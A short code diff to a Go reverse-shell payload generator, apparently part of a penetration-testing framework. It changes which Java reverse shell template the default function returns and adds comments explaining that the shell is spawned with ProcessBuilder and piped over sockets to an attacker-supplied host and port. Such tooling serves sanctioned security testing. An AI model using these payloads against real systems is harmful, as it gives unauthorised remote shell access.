+++ payload/reverse/java.go
@@ -30,6 +30,7 @@ p.destroy();
 s.close();`
 )
 
+// Defaults to the UnflattenedJava payload
 func (java *JavaPayload) Default(lhost string, lport int) string {
 	return java.UnflattenedJava(lhost, lport)
 }
@@ -37,5 +38,5 @@ func (java *JavaPayload) Default(lhost string, lport int) string {
 // An unflattened Java reverse shell. This is the "classic" Java reverse shell that spins out
 // the shell using ProcessBuilder and then redirects input/output to/from the sockets.
 func (java *JavaPayload) UnflattenedJava(lhost string, lport int) string {
-	return fmt.Sprintf(JavaDefault, lhost, lport)
+	return fmt.Sprintf(JavaProcessBuilderInteractive, lhost, lport)
 }
